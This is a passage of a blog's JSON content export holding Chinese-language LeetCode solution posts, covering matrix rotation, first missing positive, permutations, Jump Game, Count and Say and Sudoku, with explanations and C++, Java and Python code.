Image","slug":"leetcode-rotate-image","date":"2015-02-09T15:24:53.000Z","updated":"2021-01-08T13:32:16.866Z","comments":true,"path":"leetcode-rotate-image/","link":"","permalink":"https://www.hrwhisper.me/leetcode-rotate-image/","excerpt":"leetcode Rotate Image You are given an n x n 2D matrix representing an image. Rotate the image by 90 degrees (clockwise). Follow up: Could you do this in-place?","text":"leetcode Rotate Image You are given an n x n 2D matrix representing an image. Rotate the image by 90 degrees (clockwise). Follow up: Could you do this in-place? 题目地址：leetcode Rotate Image 题意：给你一个矩阵，让你顺时针旋转90° 思路： 不讨论复制一个数组然后在旋转的方法，因为太简单了。 下面的方法都是in-place的： 直接设置top, bottom, left, right四个变量，表示圈定当前要旋转的正方形范围，然后按偏移计算位置，比如左上角的先和右上角交换，然后继续左上角和右下角交换这样即可。 观察规律，(x,y)要变为(y, n - 1 - x)，为了不丢失元素，我逆序的来，先把(x,y)的值给temp，然后把之后要到(x,y)坐标的(就是(n - 1 - y, x))值给(x,y)，然后为了不重复计算，第一行列的范围[0, n- 2], 第二行[1,n-3]一次类推即可。 看到别人的，沿着 这样的 / 对称轴交换，之后只要最后一行变为第一行，倒数第二行变为第二行即进行的逆序即可。 方法1： 1234567891011121314151617181920212223242526class Solution &#123;public: void rotate(vector&lt;vector&lt;int&gt;&gt;&amp; matrix) &#123; if(matrix.empty()) return; int top = 0, bottom = matrix.size() - 1; int left = 0, right = matrix[0].size() - 1; for(;top &lt; bottom &amp;&amp; left &lt; right; ++top, ++left, --bottom, --right)&#123; for(int i = left; i &lt; right; ++i)&#123; int dis = i - left; int row = top + dis; int col = right; swap(matrix[top][i], matrix[row][col]); row = bottom; col = right - dis; swap(matrix[top][i], matrix[row][col]); row = bottom - dis; col = left; swap(matrix[top][i], matrix[row][col]); &#125; &#125; &#125;&#125;; C++思路1 1234567891011121314151617181920212223class Solution &#123;public: void rotate(vector&lt;vector&lt;int&gt;&gt;&amp; matrix) &#123; int n = matrix.size(); int start = 0, end = n - 2; while(start &lt;= end)&#123; int i = start; for(int j = start; j &lt;= end; ++j)&#123; int cx = start, cy = j; int temp = matrix[cx][cy]; for(int k = 0; k &lt; 3; ++k)&#123; int nx = n - 1 - cy, ny = cx; matrix[cx][cy] = matrix[nx][ny]; cx = nx; cy = ny; &#125; matrix[cx][cy] = temp; &#125; ++start; end = n - 2 - start; &#125; &#125;&#125;; C++ 思路2 12345678910class Solution &#123;public: void rotate(vector&lt;vector&lt;int&gt; &gt; &amp;matrix)&#123; int n = matrix.size(); for (int i = 0; i &lt; n; i++) for (int j = 0; j &lt; n - i - 1; j++) swap(matrix[i][j], matrix[n - j - 1][n - i - 1]); reverse(matrix.begin(), matrix.end()); &#125;&#125;; python 思路2 1234567891011class Solution(object): def rotate(self, matrix): &quot;&quot;&quot; :type matrix: List[List[int]] :rtype: void Do not return anything, modify matrix in-place instead. &quot;&quot;&quot; n = len(matrix) for i in range(len(matrix)): for j in range(len(matrix) - i - 1): matrix[i][j], matrix[n - j - 1][n - i - 1] = matrix[n - j - 1][n - i - 1], matrix[i][j] matrix.reverse() 本文是leetcode如下的题解 48. Rotate Image 更多题解可以查看： https://www.hrwhisper.me/leetcode-algorithm-solution/","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"}]},{"title":"leetcode First Missing Positive","slug":"leetcode-first-missing-positive","date":"2015-02-09T14:59:07.000Z","updated":"2021-01-08T13:32:16.847Z","comments":true,"path":"leetcode-first-missing-positive/","link":"","permalink":"https://www.hrwhisper.me/leetcode-first-missing-positive/","excerpt":"Given an unsorted integer array, find the first missing positive integer. For example, Given [1,2,0] return 3, and [3,4,-1,1] return 2. Your algorithm should run in O(n) time and uses constant space.","text":"Given an unsorted integer array, find the first missing positive integer. For example, Given [1,2,0] return 3, and [3,4,-1,1] return 2. Your algorithm should run in O(n) time and uses constant space. 题目地址：leetcode First Missing Positive 题目大意: 给定一些数，找出第一个没有出现的正数。 要求时间复杂度O(n) 空间复杂度O(1) 思路： 将值为i的数放在下标i-1的位置，即：nums[i]存放的应该是i+1这个数。 因此，若以下条件均满足 i + 1 != nums[i] 0 &lt; nums[i] &lt;= len(nums) nums[i] != nums[nums[i] - 1] 则可以交换。 第一个条件说明当前位置不满足条件。 第三个条件说明nums[i]应该放在nums[nums[i] - 1]这个位置上，若那个位置不是nums[i]则交换 第二个条件保证第三个条件的下标不会越界。 在交换完之后，扫描数组，若nums[i] != i + 1则返回i+ 1，若都满足说明缺的是len(nums) + 1 为什么是对的？ 因为我们把 值为x的放入了x-1的位置，那么1放入0的位置，len(nums) 放入len(nums) -1的位置。 如果存在值为x的数，那么上面的交换过程保证了位置x-1放置了x。 下面的代码中，第一个条件和第三个合并了，只需要第三个条件即可。（推导一下很显然的,若i + 1 == nums[i]，则 nums[i] == nums[i + 1 - 1]） C++ 12345678910111213class Solution &#123;public: int firstMissingPositive(vector&lt;int&gt;&amp; nums) &#123; for (int i = 0; i &lt; nums.size(); ++i) while(0 &lt; nums[i] &amp;&amp; nums[i] &lt;= nums.size() &amp;&amp; nums[i] != nums[nums[i] - 1]) swap(nums[i], nums[nums[i] - 1]); for (int i = 0; i &lt; nums.size(); ++i) if (nums[i] != (i + 1)) return i + 1; return nums.size() + 1; &#125;&#125;; Python 123456789101112131415class Solution(object): def firstMissingPositive(self, nums): &quot;&quot;&quot; :type nums: List[int] :rtype: int &quot;&quot;&quot; for i in range(len(nums)): while 0 &lt; nums[i] &lt;= len(nums) and nums[i] != nums[nums[i] - 1]: j = nums[i] - 1 nums[i], nums[j] = nums[j], nums[i] for i in range(len(nums)): if i + 1 != nums[i]: return i + 1 return len(nums) + 1 ps： 以前被py的交换坑了一把，写成如下的第九行就进入死循环。 最好是用上面的临时变量 12345678910111213141516class Solution: # @param A, a list of integers # @return an integer def firstMissingPositive(self, A): i, n =0,len(A) while i &lt; n: if A[i] &gt; 0 and A[i] &lt;= n and A[A[i] - 1] != A[i] : A[A[i] - 1] , A[i] = A[i], A[A[i] - 1] #A[i], A[A[i] - 1] = A[A[i] - 1] , A[i] error! else: i+=1 for i in range(n): if A[i] != i + 1 : return i + 1 return n + 1 本文是leetcode如下的题解 41. First Missing Positive 更多题解可以查看： https://www.hrwhisper.me/leetcode-algorithm-solution/","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"}]},{"title":"leetcode 全排列详解","slug":"leetcode-permutations","date":"2015-02-07T15:31:49.000Z","updated":"2021-01-08T13:32:16.858Z","comments":true,"path":"leetcode-permutations/","link":"","permalink":"https://www.hrwhisper.me/leetcode-permutations/","excerpt":"本文为leetcode 全排列的详解，包括： 31 Next Permutation 46 Permutations 47 Permutations II 60 Permutation Sequence","text":"本文为leetcode 全排列的详解，包括： 31 Next Permutation 46 Permutations 47 Permutations II 60 Permutation Sequence 一、STL next_permutation剖析 C++ STL中，有next_permutation可以直接调用，但是这样做题就没意思啦。 那么STL的next_permutation是怎么实现的呢？ 下面的摘自wiki百科： Find the largest index k such that a[k] &lt; a[k + 1]. If no such index exists, the permutation is the last permutation. Find the largest index l such that a[k] &lt; a[l]. Since k+1 is such an index, l is well defined and satisfies k &lt; l. Swap a[k] with a[l]. Reverse the sequence from a[k+1] up to and including the last element a[n]. 第一步找出一个k，使得k之后的为递减序列。（k之后的就没有全排列的结果了。想一下4321这种，都是逆序的） 接下来，我们需要找到一个最大的下标L使得 a[k]&lt;a[L]，交换a[k]和a[L] （就是说递减序列中比a[k]大的最小的元素， 这样和位置k的进行交换，位置k之后的就又有全排列了） 最后对k+1之后的逆置即可（在纸上试试），这样就变成了升序。 eg: 1 4 3 2 k=0 L=3 swap-&gt; 2431 逆置-&gt; 2134 二、题解 31. Next Permutation Implement next permutation, which rearranges numbers into the lexicographically next greater permutation of numbers. If such arrangement is not possible, it must rearrange it as the lowest possible order (ie, sorted in ascending order). The replacement must be in-place, do not allocate extra memory. Here are some examples. Inputs are in the left-hand column and its corresponding outputs are in the right-hand column. 1,2,3 → 1,3,2 3,2,1 → 1,2,3 1,1,5 → 1,5,1 题目地址：leetcode Next Permutation 题目大意：给定一串整数，要求求出它的下一个排列，如1,2,3-&gt;1,3,2 3,2,1-&gt;1,2,3 思路：见上面的剖析 C++ 123456789101112131415161718192021class Solution &#123;public: void nextPermutation(vector&lt;int&gt;&amp; nums) &#123; int i = nums.size() - 2, j = nums.size() - 1; for(; i &gt;= 0; --i) if(nums[i] &lt; nums[i + 1]) break; if(i &lt; 0)&#123; reverse(nums.begin(), nums.end()); return; &#125; for(; j &gt; i; --j) if(nums[i] &lt; nums[j]) break; swap(nums[i], nums[j]); reverse(nums.begin() + i + 1, nums.end()); &#125;&#125;; Java 1234567891011121314151617181920212223242526class Solution &#123; private void swap(int[] nums, int i, int j) &#123; int t = nums[i]; nums[i] = nums[j]; nums[j] = t; &#125; private void reverse(int[] nums, int start) &#123; for (int i = start, j = nums.length - 1; i &lt; j; i++, j--) swap(nums, i, j); &#125; public void nextPermutation(int[] nums) &#123; int i = nums.length - 2, j = i + 1; for (; i &gt;= 0 &amp;&amp; nums[i] &gt;= nums[i + 1]; i--) ; if (i &lt; 0) &#123; Arrays.sort(nums); return; &#125; for (; j &gt;= 0 &amp;&amp; nums[i] &gt;= nums[j]; j--) ; swap(nums, i, j); reverse(nums, i + 1); &#125;&#125; Python 123456789101112131415161718192021class Solution(object): def nextPermutation(self, nums): &quot;&quot;&quot; :type nums: List[int] :rtype: void Do not return anything, modify nums in-place instead. &quot;&quot;&quot; i = len(nums) - 2 while i &gt;= 0: if nums[i] &lt; nums[i + 1]: break i -= 1 if i &lt; 0: nums.sort() return j = len(nums) - 1 while i &lt; j: if nums[i] &lt; nums[j]: break j -= 1 nums[i], nums[j] = nums[j], nums[i] nums[i + 1:] = nums[i + 1:][::-1] 46. Permutations Given a collection of distinct numbers, return all possible permutations. For example, [1,2,3] have the following permutations: [1,2,3], [1,3,2], [2,1,3], [2,3,1], [3,1,2], and [3,2,1]. 题目地址：leetcode Permutations 题目大意: 给定一个不重复的数组，求全排列 思路： 可以用上面的STL next_permutation思想，也可以递归解决。 递归的想法是：nums的全排列相当于： nums[0] + permute(nums nums[0]) # 表示除了0以外的数的全排列 nums[1] + permute(nums nums[1]) .... nums[n-1] + permute(nums nums[n-1]) C++ 123456789101112131415161718192021class Solution &#123; void dfs(int cur, vector&lt;int&gt;&amp; nums, vector&lt;vector&lt;int&gt;&gt; &amp;ans) &#123; if (cur == nums.size() - 1) &#123; ans.push_back(nums); return; &#125; //0...cur - 1都固定了 for (int i = cur; i &lt; nums.size(); i++) &#123; swap(nums[cur], nums[i]); dfs(cur + 1, nums, ans); swap(nums[cur], nums[i]); &#125; &#125;public: vector&lt;vector&lt;int&gt;&gt; permute(vector&lt;int&gt;&amp; nums) &#123; vector&lt;vector&lt;int&gt;&gt; ans; dfs(0, nums, ans); return ans; &#125;&#125;; Java 123456789101112131415161718192021222324252627class Solution &#123; private void swap(int[] nums, int i, int j) &#123; int t = nums[i]; nums[i] = nums[j]; nums[j] = t; &#125; private void dfs(int cur, int[] nums, List&lt;List&lt;Integer&gt;&gt; ans) &#123; if (cur == nums.length - 1) &#123; List&lt;Integer&gt; res = new ArrayList&lt;&gt;(); for (int num : nums) res.add(num); ans.add(res); return; &#125; for (int i = cur; i &lt; nums.length; i++) &#123; swap(nums, i, cur); dfs(cur + 1, nums, ans); swap(nums, i, cur); &#125; &#125; public List&lt;List&lt;Integer&gt;&gt; permute(int[] nums) &#123; List&lt;List&lt;Integer&gt;&gt; ans = new ArrayList&lt;List&lt;Integer&gt;&gt;(); dfs(0, nums, ans); return ans; &#125;&#125; 47. Permutations II Given a collection of numbers that might contain duplicates, return all possible unique permutations. For example, [1,1,2] have the following unique permutations: [1,1,2], [1,2,1], and [2,1,1]. 题目地址：leetcode Permutations II 题目大意：给定一个可能包含重复数字的数组，求全排列，要求去重。 思路 方法1，去重： 什么时候会产生重复呢？ 注意，上面一题中，我们每次都让0...start - 1固定，然后交换nums[i]和nums[start]，接着继续递归下一层，然后恢复交换。 比如nums[i]有重复的元素，它之前的重复元素已经交换到start这个位置，那么之后nums[i]也要交换到start这个位置的话，那必然是重复的，因此我们可以记录一个数是不是被交换到start这个位置了。 只判断根据nums[i]和nums[start]是否相同判断是否重复是不够的，因为比如start的值为2，一开始交换到start的值为1，然后下一次交换过去的为1，两次都是判断2！=1. 12345678910111213141516171819202122class Solution &#123; void dfs(int start, vector&lt;int&gt; &amp;nums, vector&lt;vector&lt;int&gt;&gt; &amp;ans)&#123; if(start == nums.size() - 1)&#123; ans.push_back(nums); return; &#125; unordered_set&lt;int&gt; vis; for(int i = start; i &lt; nums.size(); ++i)&#123; if(vis.find(nums[i]) != vis.end()) continue; vis.insert(nums[i]); swap(nums[i], nums[start]); dfs(start + 1, nums, ans); swap(nums[i], nums[start]); &#125; &#125;public: vector&lt;vector&lt;int&gt;&gt; permuteUnique(vector&lt;int&gt;&amp; nums) &#123; vector&lt;vector&lt;int&gt;&gt; ans; dfs(0, nums, ans); return ans; &#125;&#125;; 方法2， STL的next_permutation思想： 第一步找出一个k，使得k之后的为递减序列，如果k&lt;0说明已经都是递减的了，就是说最后一个，递推结束。 C++ 123456789101112131415161718192021class Solution &#123; bool next_permutation(vector&lt;int&gt; &amp;nums) &#123; int i = nums.size() - 2; for (; i &gt;= 0 &amp;&amp; nums[i] &gt;= nums[i + 1]; i--); if (i &lt; 0) return false; int j = nums.size() - 1; for (; j &gt;= 0 &amp;&amp; nums[i] &gt;= nums[j]; j--); swap(nums[i], nums[j]); reverse(nums.begin() + i + 1, nums.end()); return true; &#125;public: vector&lt;vector&lt;int&gt;&gt; permuteUnique(vector&lt;int&gt;&amp; nums) &#123; vector&lt;vector&lt;int&gt;&gt; ans; sort(nums.begin(), nums.end()); do &#123; ans.push_back(nums); &#125; while (next_permutation(nums)); return ans; &#125;&#125;; Java 123456789101112131415161718192021222324252627282930313233class Solution &#123; private void swap(int[] nums, int i, int j) &#123; int t = nums[i]; nums[i] = nums[j]; nums[j] = t; &#125; private void reverse(int[] nums, int start) &#123; for (int i = start, j = nums.length - 1; i &lt; j; i++, j--) swap(nums, i, j); &#125; private boolean next_permutation(int[] nums) &#123; int i = nums.length - 2, j = i + 1; for (; i &gt;= 0 &amp;&amp; nums[i] &gt;= nums[i + 1]; i--) ; if (i &lt; 0) return false; for (; j &gt;= 0 &amp;&amp; nums[i] &gt;= nums[j]; j--) ; swap(nums, i, j); reverse(nums, i + 1); return true; &#125; public List&lt;List&lt;Integer&gt;&gt; permuteUnique(int[] nums) &#123; List&lt;List&lt;Integer&gt;&gt; ans = new ArrayList&lt;List&lt;Integer&gt;&gt;(); Arrays.sort(nums); do &#123; List&lt;Integer&gt; res = new ArrayList&lt;&gt;(); for (int num : nums) res.add(num); ans.add(res); &#125; while (next_permutation(nums)); return ans; &#125;&#125; Python 1234567891011121314151617181920212223class Solution(object): def next_permutation(self, nums): i = len(nums) - 2 while i &gt;= 0 and nums[i] &gt;= nums[i + 1]: i -= 1 if i &lt; 0: return False j = len(nums) - 1 while j &gt;= 0 and nums[j] &lt;= nums[i]: j -= 1 nums[i], nums[j] = nums[j], nums[i] nums[:] = nums[:i + 1] + nums[:i:-1] return True def permuteUnique(self, nums): &quot;&quot;&quot; :type nums: List[int] :rtype: List[List[int]] &quot;&quot;&quot; nums.sort() ans = [nums[:]] while self.next_permutation(nums): ans.append(nums[:]) return ans 60. Permutation Sequence The set [1,2,3,…,n] contains a total of n! unique permutations. By listing and labeling all of the permutations in order, We get the following sequence (ie, for n = 3): \"123\" \"132\" \"213\" \"231\" \"312\" \"321\" Given n and k, return the kth permutation sequence. Note: Given n will be between 1 and 9 inclusive. 题目地址：leetcode Permutation Sequence 题目大意：给定n和k，求1~n中能组成的排列中的第k个排列。 思路：难道要像上面几题，不断都next_permutation？ 答案显然是否定的。 其实对于每个排列，我们算得出来。 1~n的排列数有n! ，但如果我们第一个位置上放1，那么有(n-1)!种排列。 故，对于k，首先确定第一个数放几，然后第二个数……，一直到第n个数。 C++ 对于放置的第cnt个数，我们有： j = k / (n - 1)! （算出应该放第几个） k = k %(n - 1)!（k剩余多少个） 下面代码首先k -= 1， 这是为了让k是从0开始的，便于除法取mod。(比如k==（n-1)!，此时位置j应该恰好可以用，如k=2, (n-1)!= 2的时候，2/2=1，但其实第一个数就可以覆盖到了。) 123456789101112131415161718192021class Solution &#123;public: string getPermutation(int n, int k) &#123; vector&lt;int&gt; count(n + 1, 1); vector&lt;int&gt; nums(n, 1); for (int i = 2; i &lt;= n; ++i) &#123; count[i] = i * count[i - 1]; nums[i - 1] = i; &#125; --k; string ans; for (int i = n; i &gt;= 1; --i) &#123; //第i个位置 int j = k / count[i - 1]; //第j个数 k = k % count[i - 1]; ans += nums[j] + &#x27;0&#x27;; nums.erase(nums.begin() + j); &#125; return ans; &#125;&#125;; Python 1234567891011121314151617181920class Solution(object): def getPermutation(self, n, k): &quot;&quot;&quot; :type n: int :type k: int :rtype: str &quot;&quot;&quot; nums = [i for i in range(1, n + 1)] count = [1] * (n + 1) for i in range(2, n + 1): count[i] = count[i - 1] * i k -= 1 ans = [] for i in range(n, 0, -1): pos = k // count[i - 1] k = k % count[i - 1] ans.append(str(nums[pos])) nums.pop(pos) return &#x27;&#x27;.join(ans) 更多题解可以查看： https://www.hrwhisper.me/leetcode-algorithm-solution/","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"}]},{"title":"leetcode 55 Jump Game || 45 Jump Game II","slug":"leetcode-jump-game","date":"2015-02-07T15:23:34.000Z","updated":"2021-01-08T13:32:16.851Z","comments":true,"path":"leetcode-jump-game/","link":"","permalink":"https://www.hrwhisper.me/leetcode-jump-game/","excerpt":"本次题解包括 45. Jump Game II 55. Jump Game","text":"本次题解包括 45. Jump Game II 55. Jump Game 55. Jump Game Given an array of non-negative integers, you are initially positioned at the first index of the array. Each element in the array represents your maximum jump length at that position. Determine if you are able to reach the last index. For example: A = [2,3,1,1,4], return true. A = [3,2,1,0,4], return false. 题目地址：leetcode Jump Game 题目大意: 数组nums[i]表示能i这个位置能调到的步数。判断是否能从0跳到n-1 思路: 一看，不用构图，隐式的BFS，一敲TLE 想想DP O(N)过了,设maxJump为当前最远能跳到的距离。如果i+maxJump&gt;=n-1说明true，若maxJump=0说明没办法跳了，为false 设maxJump为跳到的最远距离，每i++，那么maxJump--。 然后判断是否可以更新maxJump。如果中途maxJump=0，显然无解。 C++ 12345678910111213141516171819class Solution &#123;public: bool canJump(int A[], int n) &#123; if (n == 1) return true; int maxJump =0;//current you can jump for (int i = 0; i &lt; n; i++)&#123; maxJump--; if (maxJump &lt; A[i]) maxJump = A[i]; if (!maxJump) return false; if (maxJump + i &gt;= n - 1 ) return true; &#125; return false; &#125;&#125;; 更简单的写法： cover表示当前覆盖到的下标， cover &lt; i 则无解 如果cover &gt;= len(nums)-1，说明跳到了目的地，有解。 否则cover = max(cover, nums[i] + i) 即更新最大的跳到的位置 C++ 1234567891011121314class Solution &#123;public:bool canJump(vector&lt;int&gt;&amp; nums) &#123;int cover = 0; for(int i = 0; i &lt; nums.size(); ++i)&#123; if(cover &lt; i) return false; cover = max(cover, nums[i] + i); if(cover &gt;= nums.size() - 1) return true; &#125; return false;&#125;&#125;; Python 12345678910111213class Solution(object): def canJump(self, nums): &quot;&quot;&quot; :type nums: List[int] :rtype: bool &quot;&quot;&quot; cover = 0 for i in range(len(nums)): if cover &lt; i: return False cover = max(cover,nums[i] + i) if cover &gt;= len(nums) - 1: return True return False 另一种写法： 维护l,r为当前的区间（类似BFS的思想），然后每次在这区间中取能跳到的最远距离。每次更新l = r + 1, r = new_r 若最终r比n-1大，说明可以到达。复杂度也是O(n) 123456789101112131415class Solution &#123;public: bool canJump(vector&lt;int&gt;&amp; nums) &#123; int n = nums.size(); int l = 0, r = 0; while(l &lt;= r &amp;&amp; r &lt; n - 1)&#123; int nr = r; for(int i = l; i &lt;= r; ++i) nr = max(nr, i + nums[i]); l = r + 1; r = nr; &#125; return r &gt;= n - 1; &#125;&#125;; 45. Jump Game II Given an array of non-negative integers, you are initially positioned at the first index of the array. Each element in the array represents your maximum jump length at that position. Your goal is to reach the last index in the minimum number of jumps. For example: Given array A = [2,3,1,1,4] The minimum number of jumps to reach the last index is 2. (Jump 1 step from index 0 to 1, then 3 steps to the last index.) Note: You can assume that you can always reach the last index. 题目地址：leetcode Jump Game II 题目大意: 和55题差不多，只不过是求到终点的最小步数。 思路: DP超时，可以用类似55题的方法： cur_cover表示当前能跳到的最远距离，last_cover表示上次最远可以跳到的距离。 那么，对于每次last_cover &lt; i 时，说明跳上一次不到i，需要++level C++ 12345678910111213141516class Solution &#123;public:int jump(vector&lt;int&gt;&amp; nums) &#123;int level = 0, last_cover = 0, cur_cover = 0; for(int i = 0; i &lt; nums.size(); ++i)&#123; if(last_cover &lt; i)&#123; last_cover = cur_cover; ++level; &#125; else if(last_cover &gt;= nums.size() - 1) return level; cur_cover = max(cur_cover, nums[i] + i); &#125;return level;&#125;&#125;; Python 123456789101112131415class Solution(object): def jump(self, nums): &quot;&quot;&quot; :type nums: List[int] :rtype: int &quot;&quot;&quot; level = last_cover = cur_cover = 0 for i in range(len(nums)): if last_cover &lt; i: last_cover = cur_cover level += 1 elif last_cover &gt;= len(nums) - 1: return level cur_cover = max(cur_cover, nums[i] + i) return level 另一种写法： 维护l,r为当前的区间（类似BFS的思想），然后每次在这区间中取能跳到的最远距离，这区间的step都是相同的。 若最终r比n-1大，说明可以到达，且step步。复杂度也是O(n) 12345678910111213141516class Solution &#123;public: int jump(vector&lt;int&gt;&amp; nums) &#123; int n = nums.size(); int l = 0, r = 0, step = 0; while(r &lt; n - 1)&#123; int nr = r; for(int i = l; i &lt;= r; ++i) nr = max(nr, i + nums[i]); ++step; l = r + 1; r = nr; &#125; return step; &#125;&#125;; 本文是leetcode如下的题解 45. Jump Game II 55. Jump Game 更多题解可以查看： https://www.hrwhisper.me/leetcode-algorithm-solution/","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"}]},{"title":"leetcode 38 Count and Say","slug":"leetcode-count-and-say","date":"2015-02-07T06:28:43.000Z","updated":"2021-01-08T13:32:16.833Z","comments":true,"path":"leetcode-count-and-say/","link":"","permalink":"https://www.hrwhisper.me/leetcode-count-and-say/","excerpt":"The count-and-say sequence is the sequence of integers beginning as follows: 1, 11, 21, 1211, 111221, ... 1 is read off as \"one 1\" or 11. 11 is read off as \"two 1s\" or 21. 21 is read off as \"one 2, then one 1\" or 1211. Given an integer n, generate the _n_th sequence. Note: The sequence of integers will be represented as a string.","text":"The count-and-say sequence is the sequence of integers beginning as follows: 1, 11, 21, 1211, 111221, ... 1 is read off as \"one 1\" or 11. 11 is read off as \"two 1s\" or 21. 21 is read off as \"one 2, then one 1\" or 1211. Given an integer n, generate the _n_th sequence. Note: The sequence of integers will be represented as a string. 题目地址：leetcode Count and Say 题目大意: n=1 返回1 n=2由于n=1的结果为1，有1个1，所以返回11 n=3由于n=2结果为11，有2个1，返回21 n=4由于n=3结果为21，有1个2和1个1，所以返回1211 给定n,以此类推 C++ 12345678910111213141516171819202122232425class Solution &#123;public: string cal(string &amp;s)&#123; string ans = &quot;&quot;; int cnt =1; int len = s.length(); for (int i = 0; i &lt; len; i++) &#123; if (i + 1 &lt; len &amp;&amp; s[i] != s[i + 1])&#123; ans = ans + char(cnt+48) + s[i]; cnt = 1; &#125; else if (i + 1 &lt; len) cnt++; &#125; ans = ans + char(cnt+48) + s[len-1]; return ans; &#125; string countAndSay(int n) &#123; string s = &quot;1&quot;; for (int i = 1; i &lt; n; i++) s = cal(s); return s; &#125;&#125;; Python 123456789101112131415161718192021class Solution: # @return a string def countAndSay(self, n): s=&#x27;1&#x27; for i in range(1,n): s=self.cal(s) return s def cal(self,s): cnt=1 length=len(s) ans=&#x27;&#x27; for i ,c in enumerate(s): if i+1 &lt; length and s[i]!=s[i+1]: ans=ans+str(cnt)+c cnt=1 elif i+1 &lt;length: cnt=cnt+1 ans=ans+str(cnt)+c return ans 更多题解可以查看： https://www.hrwhisper.me/leetcode-algorithm-solution/","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"}]},{"title":"leetcode 36. Valid Sudoku || 37. Sudoku Solver","slug":"leetcode-valid-sudoku-solver","date":"2015-02-06T10:32:10.000Z","updated":"2020-10-26T15:19:35.435Z","comments":true,"path":"leetcode-valid-sudoku-solver/","link":"","permalink":"https://www.hrwhisper.me/leetcode-valid-sudoku-solver/","excerpt":"本次题解包括 36. Valid Sudoku 37. Sudoku Solver","text":"本次题解包括 36. Valid Sudoku 37. Sudoku Solver 36. Valid Sudoku Determine if a Sudoku is valid, according to: Sudoku Puzzles - The Rules. The Sudoku board could be partially filled, where empty cells are filled with the character '.'. A partially filled sudoku which is valid. Note: A valid Sudoku board (partially filled) is not necessarily solvable. Only the filled cells need to be validated. 题目地址：leetcode Valid Sudoku 题目大意：给你一个数独，让你判断是否是合法的数独。合法的数度定义为：每一行和每一列的数字以及每9个宫格数字不能重复出现。 思路： 先判断行和列是否有重复的，再判断9个是否有重复的。 直观的写法: C++ 123456789101112131415161718192021222324252627282930313233343536373839404142class Solution &#123;public: bool isValidSudoku(vector&lt;vector&lt;char&gt;&gt;&amp; board) &#123; for (int i = 0; i &lt; 9; ++i) &#123; vector&lt;bool&gt; vis(10, false); for (int j = 0; j &lt; 9; ++j) &#123; char c = board[i][j]; if (c == &#x27;.&#x27;) continue; c -= &#x27;0&#x27;; if (vis[c]) return false; vis[c] = true; &#125; &#125; for (int j = 0; j &lt; 9; ++j) &#123; vector&lt;bool&gt; vis(10, false); for (int i = 0; i &lt; 9; ++i) &#123; char c = board[i][j]; if (c == &#x27;.&#x27;) continue; c -= &#x27;0&#x27;; if (vis[c]) return false; vis[c] = true; &#125; &#125; for (int si = 0; si &lt; 9; si += 3) &#123; for (int sj = 0; sj &lt; 9; sj += 3) &#123; vector&lt;bool&gt; vis(10, false); for (int i = 0; i &lt; 3; ++i) &#123; for (int j = 0; j &lt; 3; ++j) &#123; char c = board[si + i][sj + j]; if (c == &#x27;.&#x27;) continue; c -= &#x27;0&#x27;; if (vis[c]) return false; vis[c] = true; &#125; &#125; &#125; &#125; return true; &#125;&#125;; 更好的写法： C++ 1234567891011121314151617class Solution &#123;public: bool isValidSudoku(vector&lt;vector&lt;char&gt;&gt;&amp; board) &#123; bool row_vis[9][9] = &#123; false &#125;, col_vis[9][9] = &#123; false &#125;, sub_box_vis[9][9] = &#123; false &#125;; for (int i = 0; i &lt; 9; ++i) &#123; for (int j = 0; j &lt; 9; ++j) &#123; if (board[i][j] == &#x27;.&#x27;) continue; int index = board[i][j] - &#x27;1&#x27;; int sub_index = i / 3 * 3 + j / 3; if (row_vis[i][index] || col_vis[j][index] || sub_box_vis[sub_index][index]) return false; row_vis[i][index] = col_vis[j][index] = sub_box_vis[sub_index][index] = true; &#125; &#125; return true; &#125;&#125;; python 123456789101112131415161718192021class Solution(object): def isValidSudoku(self, board): &quot;&quot;&quot; :type board: List[List[str]] :rtype: bool &quot;&quot;&quot; row_vis = [[False] * 9 for _ in range(9)] col_vis = [[False] * 9 for _ in range(9)] sub_box_vis = [[False] * 9 for _ in range(9)] for i in range(9): for j in range(9): if board[i][j] == &#x27;.&#x27;: continue index = ord(board[i][j]) - ord(&#x27;1&#x27;) sub_index = i // 3 * 3 + j // 3 if row_vis[i][index] or col_vis[j][index] or sub_box_vis[sub_index][index]: return False row_vis[i][index] = col_vis[j][index] = sub_box_vis[sub_index][index] = True return True 37. Sudoku Solver Write a program to solve a Sudoku puzzle by filling the empty cells. Empty cells are indicated by the character '.'. You may assume that there will be only one unique solution. A sudoku puzzle... ...and its solution numbers marked in red. 题目地址：leetcode Sudoku Solver 题目大意： 给个数独，让你输出解 思路： C++ 12345678910111213141516171819202122232425262728293031323334class Solution &#123; bool dfs(int cur, vector&lt;vector&lt;char&gt;&gt; &amp;board, bool row[][9], bool col[][9], bool grid[][9])&#123; if(cur &gt;= 81) return true; int x = cur / 9, y = cur % 9; if(board[x][y] != &#x27;.&#x27;) return dfs(cur + 1, board, row, col, grid); for(int i = 0; i &lt; 9; ++i)&#123; int k = x / 3 * 3 + y / 3; if(row[x][i] col[y][i] grid[k][i]) continue; row[x][i] = col[y][i] = grid[k][i] = true; board[x][y] = i + &#x27;1&#x27;; if(dfs(cur + 1, board, row, col, grid)) return true; board[x][y] = &#x27;.&#x27;; row[x][i] = 